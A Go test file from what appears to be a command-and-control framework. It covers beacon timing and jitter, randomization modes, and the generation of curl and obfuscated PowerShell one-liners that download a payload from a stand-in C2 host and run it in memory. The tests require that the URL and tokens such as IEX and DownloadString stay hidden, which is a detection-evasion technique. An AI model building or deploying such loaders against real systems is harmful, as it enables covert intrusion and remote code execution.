package server

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/forgec2/forgec2/internal/obfuscation"
)

func TestClampIntervalJitter_Defaults(t *testing.T) {
	interval, jitter := clampIntervalJitter(0, 0, 0)

	if interval != 5 {
		t.Fatalf("interval = %d, want 5 (default)", interval)
	}
	if jitter != 0 {
		t.Fatalf("jitter = %d, want 0", jitter)
	}
}

func TestClampIntervalJitter_BeaconTime(t *testing.T) {
	interval, jitter := clampIntervalJitter(5, 20, 30)

	if interval != 30 {
		t.Fatalf("interval = %d, want 30 (from beaconTime)", interval)
	}
	if jitter != 20 {
		t.Fatalf("jitter = %d, want 20", jitter)
	}
}

func TestClampIntervalJitter_Range(t *testing.T) {
	tests := []struct {
		name         string
		interval     int
		jitter       int
		beaconTime   int
		wantInterval int
		wantJitter   int
	}{
		{"negative interval clamped to 5", -1, 50, 0, 5, 50},
		{"interval capped at 86400", 99999, 50, 0, 86400, 50},
		{"negative jitter clamped to 0", 10, -10, 0, 10, 0},
		{"jitter capped at 100", 10, 200, 0, 10, 100},
		{"valid range unchanged", 15, 50, 0, 15, 50},
		{"beaconTime overrides interval", 5, 10, 60, 60, 10},
		{"beaconTime overrides interval even if interval valid", 100, 30, 120, 120, 30},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			gotInterval, gotJitter := clampIntervalJitter(tc.interval, tc.jitter, tc.beaconTime)
			if gotInterval != tc.wantInterval {
				t.Errorf("interval = %d, want %d", gotInterval, tc.wantInterval)
			}
			if gotJitter != tc.wantJitter {
				t.Errorf("jitter = %d, want %d", gotJitter, tc.wantJitter)
			}
		})
	}
}

func TestParseArchitecture_Default(t *testing.T) {
	got := parseArchitecture("")
	if got != "amd64" {
		t.Fatalf("parseArchitecture(\"\") = %q, want \"amd64\"", got)
	}
}

func TestParseArchitecture_Arm64(t *testing.T) {
	got := parseArchitecture("arm64")
	if got != "arm64" {
		t.Fatalf("parseArchitecture(\"arm64\") = %q, want \"arm64\"", got)
	}
}

func TestParseArchitecture_Whitespace(t *testing.T) {
	got := parseArchitecture("  amd64  ")
	if got != "amd64" {
		t.Fatalf("parseArchitecture(\"  amd64  \") = %q, want \"amd64\"", got)
	}
}

func TestBuildOneLiners_VerifiedVariants(t *testing.T) {
	// Without a hash only the base variants are emitted.
	base := buildOneLiners("exe", "", "http://x/p", "/tmp/p", "", "")
	withHash := buildOneLiners("exe", "", "http://x/p", "/tmp/p", "", "abc123")
	if len(withHash) != len(base)+2 {
		t.Fatalf("exe verified variants = %d, want base+2 (%d)", len(withHash), len(base)+2)
	}
	joined := ""
	for _, it := range withHash {
		joined += it.Name + "\n" + it.Command + "\n"
	}
	if !strings.Contains(joined, "abc123") {
		t.Fatal("verified variants must embed the SHA-256")
	}
	if !strings.Contains(joined, "-C -") {
		t.Fatal("verified variants must use resumable curl (-C -)")
	}

	linBase := buildOneLiners("linux", "", "http://x/p", "/tmp/p", "", "")
	linHash := buildOneLiners("linux", "", "http://x/p", "/tmp/p", "", "abc123")
	if len(linHash) != len(linBase)+1 {
		t.Fatalf("linux verified variants = %d, want base+1 (%d)", len(linHash), len(linBase)+1)
	}
}

func TestSha256OfFile(t *testing.T) {
	p := filepath.Join(t.TempDir(), "p.bin")
	if err := os.WriteFile(p, []byte("hello"), 0644); err != nil {
		t.Fatal(err)
	}
	sum, size := sha256OfFile(p)
	if sum != "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824" {
		t.Fatalf("sha256 = %q, want hello digest", sum)
	}
	if size != 5 {
		t.Fatalf("size = %d, want 5", size)
	}
	if sum2, size2 := sha256OfFile(filepath.Join(t.TempDir(), "missing")); sum2 != "" || size2 != 0 {
		t.Fatalf("missing file must return empty/0, got %q/%d", sum2, size2)
	}
}

func TestNormalizeBeaconRandomization(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", ""},
		{"linear", "linear"},
		{"gaussian", "gaussian"},
		{"exponential", "exponential"},
		{"two_stage", "two_stage"},
		{"adaptive", "adaptive"},
		{"  GAUSSIAN  ", "gaussian"}, // trims + lowercases
		{"ExpOnEnTial", "exponential"},
		{"garbage", ""},    // unknown maps to build-time default
		{"two-stage", ""},  // wrong separator is not silently accepted
		{"normaldist", ""}, // a real word that is not a supported mode
	}
	for _, tc := range cases {
		if got := normalizeBeaconRandomization(tc.in); got != tc.want {
			t.Errorf("normalizeBeaconRandomization(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestClampMaxRandomIntervalMs(t *testing.T) {
	cases := []struct {
		in   int
		want int
	}{
		{0, 0},       // disabled
		{1500, 1500}, // in range
		{600000, 600000},
		{600001, 600000}, // over the 10-minute ceiling
		{-5, 0},          // negative means disabled, never a negative delay
	}
	for _, tc := range cases {
		if got := clampMaxRandomIntervalMs(tc.in); got != tc.want {
			t.Errorf("clampMaxRandomIntervalMs(%d) = %d, want %d", tc.in, got, tc.want)
		}
	}
}

// TestResolveBeaconRandomization pins the precedence the Generate form relies on.
// The critical case: an explicit "linear" form value must be honored even when
// the fleet default is Gaussian -- conflating "linear" with unset (the pre-fix
// bug) silently shipped Gaussian instead.
func TestResolveBeaconRandomization(t *testing.T) {
	cases := []struct {
		name     string
		formMode string
		defMode  string
		want     string
	}{
		{"explicit linear beats gaussian fleet default", "linear", "gaussian", "linear"},
		{"explicit gaussian", "gaussian", "linear", "gaussian"},
		{"default sentinel falls to fleet default", "default", "gaussian", "gaussian"},
		{"empty (omitted) falls to fleet default", "", "gaussian", "gaussian"},
		{"case-insensitive form wins", "  GAUSSIAN ", "linear", "gaussian"},
		{"garbage form falls to valid fleet default", "nonsense", "adaptive", "adaptive"},
		{"garbage form, invalid fleet default -> empty (agent keeps built-in)", "nonsense", "bogus", ""},
		{"both empty -> empty (agent keeps built-in linear)", "", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := resolveBeaconRandomization(tc.formMode, tc.defMode); got != tc.want {
				t.Errorf("resolveBeaconRandomization(%q,%q) = %q, want %q", tc.formMode, tc.defMode, got, tc.want)
			}
		})
	}
}

func findOneLiner(items []oneLinerItem, name string) string {
	for _, item := range items {
		if item.Name == name {
			return item.Command
		}
	}
	return ""
}

func TestBuildOneLiners_PS1VerifiedMemoryLoader(t *testing.T) {
	const name = "PS1 Verified Memory Load (obfuscated)"
	base := buildOneLiners("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "")
	verified := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "ABC123", obfuscation.PSObfuscateOptions{})
	if len(verified) != len(base)+2 {
		t.Fatalf("ps1 verified variants = %d, want base+2 (obfuscated + pwsh), got %d", len(verified), len(base)+2)
	}
	cmd := findOneLiner(verified, name)
	if cmd == "" {
		t.Fatalf("verified ps1 variant %q missing", name)
	}
	// The legacy launcher encodes UTF-8; neither URL nor digest may leak in
	// cleartext, and IEX/DownloadString are the two tokens we are avoiding.
	for _, token := range []string{"https://c2.example/p", "abc123", "IEX", "DownloadString"} {
		if strings.Contains(cmd, token) {
			t.Errorf("command must not contain %q: %s", token, cmd)
		}
	}
	inner := ps1VerifiedMemoryLoader("https://c2.example/p", "ABC123")
	for _, token := range []string{"DownloadData", "SHA256", "abc123", "ScriptBlock", "for($i=0;$i -lt 3"} {
		if !strings.Contains(inner, token) {
			t.Errorf("inner loader missing %q: %s", token, inner)
		}
	}

	enc := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "/tmp/p", "", "ABC123", obfuscation.PSObfuscateOptions{Launcher: "encodedcommand"})
	encCmd := findOneLiner(enc, name)
	if !strings.Contains(encCmd, " -enc ") {
		t.Fatalf("encoded preset must produce -enc launcher: %s", encCmd)
	}
	if strings.Contains(encCmd, "https://c2.example/p") {
		t.Fatalf("encoded launcher leaked the URL: %s", encCmd)
	}
	pwshName := "PowerShell 7 (pwsh) Verified Memory Load"
	pwshCmd := findOneLiner(verified, pwshName)
	if !strings.HasPrefix(pwshCmd, "pwsh ") {
		t.Fatalf("PS7 variant must launch pwsh explicitly: %s", pwshCmd)
	}
	if strings.Contains(pwshCmd, "https://c2.example/p") {
		t.Fatalf("PS7 variant leaked the URL: %s", pwshCmd)
	}
	encPwsh := buildOneLinersWithObfuscation("ps1", "Write-Output ok", "https://c2.example/p", "", "", "ABC123", obfuscation.PSObfuscateOptions{Launcher: "encodedcommand", LauncherExe: "pwsh"})
	if got := findOneLiner(encPwsh, name); !strings.HasPrefix(got, "pwsh ") || !strings.Contains(got, " -enc ") {
		t.Fatalf("explicit pwsh preset must produce a pwsh -enc launcher: %s", got)
	}
	if findOneLiner(encPwsh, pwshName) != "" {
		t.Fatal("no duplicate PS7 variant when the launcher is already pinned to pwsh")
	}
	for _, tc := range []struct{ in, want string }{{"", ""}, {"auto", ""}, {"PowerShell", "powershell"}, {" PWSH ", "pwsh"}} {
		got, ok := normalizePowerShellExe(tc.in)
		if !ok || got != tc.want {
			t.Errorf("normalizePowerShellExe(%q) = %q,%v; want %q,true", tc.in, got, ok, tc.want)
		}
	}
	if _, ok := normalizePowerShellExe("cmd.exe"); ok {
		t.Fatal("arbitrary launcher executable must be rejected")
	}
}
